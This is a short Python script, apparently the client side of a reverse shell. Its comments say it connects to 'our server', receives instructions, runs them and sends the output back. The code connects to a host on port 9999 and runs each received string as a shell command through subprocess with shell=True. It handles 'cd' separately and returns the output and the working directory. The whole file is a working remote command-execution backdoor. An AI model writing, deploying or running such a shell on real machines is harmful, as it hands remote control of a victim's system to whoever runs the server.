# Try and connect to our server
# Wait for the instructions
# Receives the instructions and run them
# Take the result and send them back to the server

import socket
import os
import subprocess
from utils.get_address import *


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = get_local_ip() # Get the local IP address dynamically
port = 9999

s.connect((host,port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))

        print(output_str)